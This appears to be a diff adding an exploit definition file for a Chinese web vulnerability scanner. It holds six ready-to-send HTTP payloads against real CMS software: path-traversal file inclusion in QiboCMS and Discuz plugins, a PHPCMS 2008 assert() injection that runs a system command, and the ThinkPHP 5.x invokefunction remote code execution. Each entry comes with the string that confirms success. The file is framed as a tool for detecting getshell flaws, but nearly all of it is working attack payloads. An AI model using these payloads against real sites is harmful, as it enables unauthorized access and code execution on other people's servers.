@@ -1,0 +1,60 @@
+<zbz>6</zbz>
+<bz1>
+<name>QiboCMS V5.0 /hr/listperson.php 本地文件包含</name>
+<sfjt>get</sfjt>
+<demo>/hr/listperson.php?FidTpl[list]=../images/default/default.js</demo>
+<expjc>1</expjc>
+<zjyz></zjyz>
+<xxxz>var evt = (evt) ? evt : ((window.event) ? window.event : "");</xxxz>
+</bz1>
+<bz2>
+<name>Discuz dc_mall插件前台Getshell</name>
+<sfjt>get</sfjt>
+<demo>/plugin.php?action=../../../../../robots.txt%00&id=dc_mall</demo>
+<expjc>1</expjc>
+<zjyz></zjyz>
+<xxxz>User-agent</xxxz>
+</bz2>
+<bz3>
+<name>Discuz hux_wx.inc.php前台Getshell</name>
+<sfjt>get</sfjt>
+<demo>/plugin.php?id=hux_wx:hux_wx&uid=1&mod=../../../..&ac=robots.txt%00</demo>
+<expjc>1</expjc>
+<zjyz></zjyz>
+<xxxz>User-agent</xxxz>
+</bz3>
+<bz4>
+<name>Discuz milu_seotool 插件 本地文件包含</name>
+<sfjt>get</sfjt>
+<demo>/plugin.php?id=milu_seotool:sitemap&myac=../../robots.txt%00</demo>
+<expjc>1</expjc>
+<zjyz></zjyz>
+<xxxz>User-agent</xxxz>
+</bz4>
+<bz5>
+<name>PHPCMS 2008 GETSHELL & RCE</name>
+<sfjt>post</sfjt>
+<dzkz>/type.php?template=tag_()%7B%7Dassert($_POST%5Bcombie%5D);%7B//../rss</dzkz>
+<demo>combie=system(dir);</demo>
+<cl>Cache-Control: no-cache
+Connection: Keep-Alive
+Content-Type: application/x-www-form-urlencoded
+Accept: text/html, application/xhtml+xml, */*
+Accept-Encoding: gbk, GB2312
+Accept-Language: zh-cn
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)</cl>
+<expjc>1</expjc>
+<zjyz></zjyz>
+<xxxz>more_pic.php</xxxz>
+</bz5>
+<bz6>
+<name>Thinkphp v5.x < 5.1.31，<= 5.0.23 RCE</name>
+<sfjt>get</sfjt>
+<demo>/?s=index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1</demo>
+<cl>User-Agent: python-requests/2.6.0 CPython/2.7.14 Windows/7</cl>
+<expjc>1</expjc>
+<xxxz>PHP Version</xxxz>
+</bz6>
+<bz>专为CMS通杀的 Getshell 漏洞做检测
+
+直接输入 http://网址 即可开始检测</bz>
